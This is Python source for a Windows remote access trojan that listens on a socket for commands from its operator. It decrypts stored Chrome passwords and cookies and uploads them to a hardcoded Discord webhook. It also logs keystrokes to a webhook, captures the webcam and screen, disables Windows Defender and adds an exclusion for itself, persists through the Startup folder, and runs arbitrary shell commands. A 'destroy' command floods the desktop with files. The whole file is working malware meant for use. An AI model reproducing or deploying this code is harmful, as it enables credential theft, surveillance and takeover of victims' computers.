import socket, os, cv2, pyautogui, subprocess, ctypes, sys, shutil, webbrowser, time, requests,pynput, pyperclip, sqlite3, base64, json

from datetime import datetime, timedelta

import win32crypt
from Crypto.Cipher import AES
from win10toast import ToastNotifier
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from colorama import Fore

def get_chrome_datetime(chromedate):
    if chromedate != 86400000000 and chromedate:
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except Exception as e:
            print(f"Error: {e}, chromedate: {chromedate}")
            return chromedate
    else:
        return ""

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_data(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            # not supported
            return ""

def save_cookies_to_txt(cookies):
    with open("cookies.txt", "w", encoding="utf-8") as file:
        for cookie_data in cookies:
            file.write(cookie_data + "\n\n")

def cookie(webhook):
    subprocess.call(["taskkill", "/F", "/IM", "chrome.exe"])
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "Default", "Network", "Cookies")

    filename = "Cookies.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    db.text_factory = lambda b: b.decode(errors="ignore")
    cursor = db.cursor()

    cursor.execute("""
    SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
    FROM cookies""")

    key = get_encryption_key()
    cookies = []
    for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
        if not value:
            decrypted_value = decrypt_data(encrypted_value, key)
        else:
            decrypted_value = value
        cookie_data = (f"""
        Host: {host_key}
        Cookie name: {name}
        Cookie value (decrypted): {decrypted_value}
        Creation datetime (UTC): {get_chrome_datetime(creation_utc)}
        Last access datetime (UTC): {get_chrome_datetime(last_access_utc)}
        Expires datetime (UTC): {get_chrome_datetime(expires_utc)}
        ===============================================================""")
        cookies.append(cookie_data)
        cursor.execute("""
        UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
        WHERE host_key = ?
        AND name = ?""", (decrypted_value, host_key, name))
    # commit changes
    db.commit()
    # close connection
    db.close()

    os.remove("Cookies.db")

    # Save cookies to a text file
    save_cookies_to_txt(cookies)

    # Send cookies file via webhook
    webhook_url = webhook
    files = {"file": open("cookies.txt", "rb")}
    response = requests.post(webhook_url, files=files)

    if response.status_code == 200:
        os.remove("cookies.txt")
        Functions.notification(title="Üzgünüz!", content="Ne olduğunu bizde anlayamadık...")
        return f"Succsefully sent the cookies file via webhook!"
    else:
        os.remove("cookies.txt")
        return f"Failed to send the cookies file via webhook!"

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""

def save_passwords_to_txt(passwords):
    with open("passwords.txt", "w", encoding="utf-8") as file:
        for password_data in passwords:
            file.write(password_data + "\n\n")

def main():
    results = []
    # get the AES key
    key = get_encryption_key()
    # local sqlite Chrome database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    # connect to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # `logins` table has the data we need
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # iterate over all rows
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]
        if username or password:
            result = f"Origin URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}\n"
            if date_created != 86400000000 and date_created:
                result += f"Creation date: {str(get_chrome_datetime(date_created))}\n"
            if date_last_used != 86400000000 and date_last_used:
                result += f"Last Used: {str(get_chrome_datetime(date_last_used))}\n"
            results.append(result)

    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass
    return results

def send_passwords_via_webhook(webhook):
    passwords = main()
    save_passwords_to_txt(passwords)
    # Send passwords file via webhook
    webhook_url = webhook
    files = {"file": open("passwords.txt", "rb")}
    response = requests.post(webhook_url, files=files)

    if response.status_code == 200:
        os.remove("passwords.txt")
        Functions.notification(title="Üzgünüz!", content="Ne olduğunu bizde anlayamadık...")
        return "Successfully sent the passwords file via webhook!"
    else:
        os.remove("passwords.txt")
        return "Failed to send the passwords file via webhook!"

class Functions:
    def list_dir(self):
        self.listdir = os.listdir()
        return self.listdir

    def cd(self, data):
        try:
            self.go = os.chdir(data)
            self.dizin = os.getcwd()
            return f"{Fore.GREEN}You are currently in this directory : {self.dizin}{Fore.RESET}"
        except Exception as e:
            return f"Error! {e}"

    def get_ip(self):
        self.host_name = socket.gethostname()
        self.ip_adress = socket.gethostbyname()

        return self.ip_adress
    def create_file(self, data):
        try:
            self.file = os.mkdir(data)
            return f"{Fore.GREEN}Succsesfully to created the file! : {self.file}{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"
    def delete_file(self, data):
        try:
            self.delete = os.rmdir(data)
            return f"{Fore.GREEN}Succsesfully to deleted the file : {self.delete}{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"
    def read(self, data):
        try:
            with open(data, "r") as file:
                self.content = file.read()
                return self.content
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"
    def  touch(self, data):
        try:
            with open(data, 'x') as dosya:
                pass
            return f"{Fore.GREEN}Succsesfully created file!{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def dizin(self):
        self.dizin = os.getcwd()

        return self.dizin
    def capture_camera(self):
        self.camera = cv2.VideoCapture(0)

        self.ret, self.frame = self.camera.read()

        if self.ret:
            cv2.imwrite("photo.jpg", self.frame)
            return f"{Fore.GREEN}Succsessfully the taked photo!{Fore.RESET}"
        else:
            return f"{Fore.RED}Error! Failed the capture photo!{Fore.RESET}"

        self.camera.release()

    def take_screenshot(self):
        try:
            self.screenshot = pyautogui.screenshot("error.png")
            return f"{Fore.GREEN}Succsesfully taked screenshot!{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def voice(self):
        return f"{Fore.GREEN}Succsesfully taked screenshot!{Fore.RESET}"

    def steal_password(self, data):
        try:
            return send_passwords_via_webhook(data)
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def steal_cookie(self):
        try:
            return cookie()
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def steal_history(self):
        try:
            return f"{Fore.RED}Currently under development!{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def defender_off(self):
        try:
            if ctypes.windll.shell32IsUserAnAdmin():
                self.defender = subprocess.run("sc stop WinDefend", capture_output=True, text=True, shell=True)
                return f"{Fore.GREEN}Succsesfully defender off! : {self.defender}{Fore.RESET}"
            else:
                return f"{Fore.RED}Error! You have no authority! please increase authorization{Fore.RESET}"

        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"
    def defender_on(self):
        try:
            if ctypes.windll.shell32IsUserAnAdmin():
                self.defender = subprocess.run("sc start WinDefend", capture_output=True, text=True, shell=True)
                return f"{Fore.GREEN}Succsesfully defender on!{self.defender}{Fore.RESET}"
            else:
                return f"{Fore.RED}Error! You have no authority! please increase authorization{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def exclusion(self):
        try:
            if ctypes.windll.shell32IsUserAnAdmin():
                self.script_directory = os.path.dirname(os.path.realpath(sys.argv[0]))
                self.exclusion = subprocess.run(['powershell', '-Command', f"Add-MpPreference -ExclusionPath '{self.script_directory}'"],capture_output=True, text=True)
                return f"{Fore.GREEN}Succsesfully exclusion! {self.exclusion}{Fore.RESET}"
            else:
                return f"{Fore.RED}Error! You have no authority! please increase authorization{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def kill(self, data):
        try:
            os.system(f"TASKKILL /F /IM {data}")
            return f"{Fore.GREEN}Succsessfully terminated {data}!{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def tasklist(self):
        try:
            self.result = subprocess.run(["tasklist"], capture_output=True, text=True)
            return f"{self.result.stdout}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def open_program(self, data):
        try:
            self.open = subprocess.Popen([data])
            return f"{Fore.GREEN}Succsessfully opened {self.open}{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def hide_program(self, data):
        try:
            ctypes.windll.kernel32.SetFileAttributesW(data, 2)
            return f"{Fore.GREEN}Succsessfully hideing the {data}{Fore.RESET}"

        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def unhide_program(self, data):
        try:
            ctypes.windll.kernel32.SetFileAttributesW(data, 0)
            return f"{Fore.GREEN}Succsessfully unhiding the {data}{Fore.RESET}"

        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"
    def rename(self, old_name, new_name):
        try:
            os.rename(old_name, new_name)
            return f"{Fore.GREEN}Succsessfully renamed the {old_name}{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def startup(self):
        try:
            self.program_adi = os.path.basename(sys.argv[0])
            self.hedef_dizin = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
            self.program_yolu = os.path.abspath(sys.argv[0])
            try:
                self.hedef_yol = os.path.join(self.hedef_dizin, self.program_adi)
                if not os.path.exists(self.hedef_yol):
                    shutil.copy(self.program_yolu, self.hedef_yol)
                    return f"{self.program_adi} başlangıç klasörüne kopyalandı."
                else:
                    return f"{Fore.RED}Error! {self.program_adi} It already has original parts.{Fore.RESET}"
            except Exception as e:
                return f"{Fore.RED}Error! {e}{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def download(self):
        try:
            return f"{Fore.RED}Error!{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def upload(self):
        try:
            return f"{Fore.RED}Error!{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def shutdown(self):
        try:
            os.system("shutdown /s /t 2")
            return f"{Fore.GREEN}Succsessfully shutdowning the PC{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def restart(self):
        try:
            os.system("shutdown /r /t 2")
            return f"{Fore.GREEN}Succsessfully the restarting!{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def shell(self, data):
        try:
            self.shell = subprocess.run(['powershell', '-Command', data], capture_output=True, text=True)
            return f"{self.shell}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def admin_shell(self, data):
        try:
            if ctypes.windll.shell32.IsUserAnAdmin():
                self.admin_shell = subprocess.run(['runas', '/user:Administrator', 'powershell', '-Command', data],capture_output=True, text=True)
                return f"{self.admin_shell}"
            else:
                return f"{Fore.RED}Error! You have no authority! please increase authorization{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def cmd(self, data):
        try:
            self.cmd = subprocess.run(data, capture_output=True, text=True, shell=True)
            return f"{Fore.GREEN}{self.cmd}{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def web(self, data):
        try:
            self.url = data
            webbrowser.open(data)
            return f"{Fore.GREEN}Succsesfully opened the website!{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def web_background(self, data):
        try:
            self.url = data
            self.chrome_options = Options()
            self.chrome_options.add_argument("--headless")
            self.driver = webdriver.Chrome(options=self.chrome_options)
            self.driver.get(self.url)
            time.sleep(5)
            self.driver.quit()
            return f"{Fore.GREEN}Opened the website!{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error!{e}{Fore.RESET}"

    def ping(self, data):
        try:
            self.url = data
            self.ping =os.system(f"ping {self.url}")
            return f"{Fore.GREEN}Succsesfully the activated CMD code!{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def keylogger(self, data):
        try:
            if data == "exit" or data == "stop" or data == "pause":
                return f"{Fore.GREEN}Stopped the keylogger!{Fore.RESET}"
            else:
                def emir(key, webhook_url):
                    harfler = str(key)
                    a = {
                        'content': harfler
                    }
                    headers = {
                        'Content-Type': 'application/json'
                    }
                    response = requests.post(webhook_url, json=a, headers=headers)

                webhook_url = data
                listen = pynput.keyboard.Listener(on_press=lambda key: emir(key, webhook_url))
                with listen:
                    listen.join()
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"
    def type(self, data):
        try:
            pyautogui.write(data)
            return f"{Fore.GREEN}Succsessfully write the keyboard!{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def press(self, data):
        try:
            pyautogui.press(data)
            return f"{Fore.GREEN}Succsessfully pressed the keyborad!{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def moveto(self, x, y):
        try:
            pyautogui.moveTo(x, y)
            return f"{Fore.GREEN}Moved the this cordination {x},{y} mause!{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def click(self, data):
        try:
            pyautogui.click(button=str(data))
            return f"{Fore.GREEN}Clicked the {data}{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"


    def clipboard(self):
        try:
            self.copied_text = pyperclip.paste()
            return self.copied_text
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def clipboard_delete(self):
        try:
            self.delete = pyperclip.copy(' ')
            return f"{Fore.GREEN}Succsesfully deleted clipboard!{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def clipboard_rename(self, data):
        try:
            self.copy = data
            pyperclip.copy(self.copy)
            return f"{Fore.GREEN}Succsesfully changed{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def admin(self):
        try:
            return f"{Fore.GREEN}Succsesfully upgrade user admin!{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def destroy(self, conn, name):
        try:
            conn.send(f"{Fore.GREEN}Succsesfully started the destroy the PC!{Fore.RESET}".encode())
            self.number = 0
            self.desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
            while True:
                self.number += 1
                self.file_path = os.path.join(self.desktop_path, f"{name}" + str(self.number) + ".txt")
                self.olustur = open(self.file_path, "w")
                self.olustur.close()
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

    def notification(self, title, content):
        try:
            toaster = ToastNotifier()
            toaster.show_toast(f"{title}", f"{content}", duration=5, threaded=True)
            return f"{Fore.GREEN}Succsesfully sent the notification!{Fore.RESET}"
        except Exception as e:
            return f"{Fore.RED}Error! {e}{Fore.RESET}"

Functions = Functions()

class Main:
    webhook = "https://discord.com/api/webhooks/1217526873932824597/r0HTVunZExlyg672N1vE4kD9gm77dbj7qtACVtd_Rs8dKidl0sLLcM5Ip9Y6BNg_a5Ly"
    host = "localhost"
    port = 9999

    message = f"{host} : {port} listening!"

    payload = {
        "content": message
    }

    headers = {
        "Content-Type": "application/json"
    }

    response = requests.post(webhook, data=json.dumps(payload), headers=headers)

    while True:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((host, port))
        server_socket.listen()
        print(f"{host}:{port} dinleniyor...")

        try:
            while True:
                conn, addr = server_socket.accept()
                print(f"Connected to {addr}")

                while True:
                    data = conn.recv(51200).decode()
                    print(data)

                    if data == "ls":
                        conn.send(f"{Functions.list_dir()}".encode())

                    elif data.startswith("cd "):
                        data = data[3:]
                        conn.send(f"{Functions.cd(data)}".encode())

                    elif data == "ifconfig" or data == "ipconfig":
                        conn.send(f"{Functions.get_ip()}".encode())

                    elif data.startswith("mkdir "):
                        data = data[6:]
                        conn.send(f"{Functions.create_file(data)}".encode())

                    elif data.startswith("rmdir "):
                        data = data[6:]
                        conn.send(f"{Functions.delete_file(data)}".encode())

                    elif data.startswith("cat "):
                        data = data[4:]
                        conn.send(f"{Functions.read(data)}".encode())

                    elif data.startswith("touch "):
                        data = data[6:]
                        conn.send(f"{Functions.touch(data)}".encode())

                    elif data == "pwd":
                        conn.send(f"{Functions.dizin()}".encode())

                    elif data == "cp":
                        conn.send(f"{Functions.capture_camera()}".encode())

                    elif data.startswith("pw "):
                        data = data[3:]
                        conn.send(f"{Functions.steal_password(data)}".encode())

                    elif data.startswith("password "):
                        data = data[9:]
                        conn.send(f"{Functions.steal_password(data)}".encode())

                    elif data == "cookie":
                        conn.send(f"{Functions.steal_cookie()}".encode())

                    elif data == "ss" or data == "screenshot":
                        conn.send(f"{Functions.take_screenshot()}".encode())

                    elif data == "cv" or data == "voice":
                        conn.send(f"{Functions.voice()}".encode())

                    elif data == "history":
                        conn.send(f"{Functions.steal_history()}".encode())

                    elif data.startswith("kill "):
                        data = data[5:]
                        conn.send(f"{Functions.kill(data)}".encode())

                    elif data == "ps":
                        conn.send(f"{Functions.tasklist()}".encode())

                    elif data.startswith("open "):
                        data = data[5:]
                        conn.send(f"{Functions.open_program(data)}".encode())

                    elif data.startswith("hide "):
                        data = data[5:]
                        conn.send(f"{Functions.hide_program(data)}".encode())

                    elif data.startswith("unhide "):
                        data = data[7:]
                        conn.send(f"{Functions.unhide_program(data)}".encode())

                    elif data.startswith("rename "):
                        data = data[7:]
                        old_name, new_name = data.split(",")
                        old_name = old_name.strip()
                        new_name = new_name.strip()

                        conn.send(f"{Functions.rename(old_name, new_name)}".encode())

                    elif data == "startup":
                        conn.send(f"{Functions.startup()}".encode())

                    elif data.startswith("download "):
                        data = data[9:]
                        conn.send(f"{Functions.download()}".encode())

                    elif data.startswith("upload "):
                        data = data[7:]
                        conn.send(f"{Functions.upload()}".encode())

                    elif data == "shutdown":
                        conn.send(f"{Functions.shutdown()}".encode())

                    elif data == "restart":
                        conn.send(f"{Functions.restart()}".encode())

                    elif data.startswith("shell "):
                        data = data[6:]
                        conn.send(f"{Functions.shell(data)}".encode())

                    elif data.startswith("adminshell "):
                        data = data[11:]
                        conn.send(f"{Functions.admin_shell(data)}".encode())

                    elif data.startswith("cmd "):
                        data = data[4:]
                        conn.send(f"{Functions.cmd(data)}".encode())

                    elif data.startswith("web "):
                        data = data[4:]
                        conn.send(f"{Functions.web(data)}".encode())

                    elif data.startswith("web_background "):
                        data = data[14:]
                        conn.send(f"{Functions.web_background(data)}".encode())

                    elif data.startswith("ping "):
                        data = data[5:]
                        conn.send(f"{Functions.ping(data)}".encode())

                    elif data.startswith("keylogger "):
                        data = data[10:]
                        conn.send(f"{Functions.keylogger(data)}".encode())

                    elif data.startswith("type "):
                        data = data[5:]
                        conn.send(f"{Functions.type(data)}".encode())

                    elif data.startswith("press "):
                        data = data[6:]
                        conn.send(f"{Functions.press(data)}".encode())

                    elif data.startswith("moveto "):
                        data = data[7:].replace(',', '')
                        x, y = map(int, data.split())

                        conn.send(f"{Functions.moveto(x, y)}".encode())

                    elif data.startswith("click "):
                        data = data[6:]
                        conn.send(f"{Functions.click(data)}".encode())

                    elif data.startswith("admin_shell "):
                        data = data[12:]
                        conn.send(f"{Functions.admin_shell(data)}".encode())

                    elif data == "exclusion":
                        conn.send(f"{Functions.exclusion()}".encode())

                    elif data == "defender_off":
                        conn.send(f"{Functions.defender_off()}".encode())

                    elif data == "defender_on":
                        conn.send(f"{Functions.defender_on()}".encode())

                    elif data == "clipboard":
                        conn.send(f"{Functions.clipboard()}".encode())

                    elif data == "clipboard_delete":
                        conn.send(f"{Functions.clipboard_delete()}".encode())

                    elif data.startswith("clipboard_rename "):
                        data = data[17:]
                        conn.send(f"{Functions.clipboard_rename(data)}".encode())

                    elif data == "admin":
                        conn.send(f"{Functions.admin()}".encode())

                    elif data.startswith("destroy "):
                        data = data[8:]
                        Functions.destroy(conn, data)

                    elif data.startswith("notification "):
                        data = data[13:]
                        title, content = data.split(",")
                        title = title.strip()
                        content = content.strip()
                        conn.send(f"{Functions.notification(title, content)}".encode())

                    elif data == "help" or data == "--help":
                        pass

                    else:
                        conn.send(f"{Fore.RED}Invalid option{Fore.RESET}".encode())

        except Exception as e:
            print(e)
        finally:
            conn.close